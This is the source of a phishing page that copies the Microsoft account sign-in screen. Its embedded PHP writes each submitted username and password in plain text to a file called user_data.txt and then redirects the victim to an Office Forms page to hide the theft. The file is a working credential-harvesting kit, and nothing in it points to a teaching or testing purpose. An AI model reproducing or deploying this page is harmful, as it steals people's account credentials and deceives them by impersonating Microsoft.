<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="assets/app.css" />
</head>

<body>
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get user input
        $username = $_POST['name'];
        $password = $_POST['pass'];

        // Define the file to store user input
        $file = 'user_data.txt';

        // Prepare the data to be written
        $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";

        // Write the data to the file
        file_put_contents($file, $data, FILE_APPEND);

        // Redirect to the specific Office Forms page
        header("Location: https://forms.office.com/pages/responsepage.aspx?id=7GGUHmJTKUOuRmH6PpHG0nVG8SY_HTdNr-Rr6gjJsjZUNjlDM1NKUTVGVUNTNDdNOVpGSzRGVkc3Mi4u");
        exit();
    }
    ?>

    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form action="" method="post">
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="name" class="input" placeholder="Email, phone, or Skype" required />
                </div>
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" required />
                </div>
                <div>
                    <button class="btn" id="btn_next">Next</button>
                </div>
            </form>
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="assets/question.png" alt="Question img">
                    </a>
                </p>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>

    

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox" />
                <span>Don't show this again</span>
            </label>
            <div class="btn-group">
                <button class="btn btn-sec" id="btn_final">No</button>
                <button class="btn" id="btn_final">Yes</button>
            </div>
        </div>
    </section>
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="assets/app.js"></script>
</body>

</html>
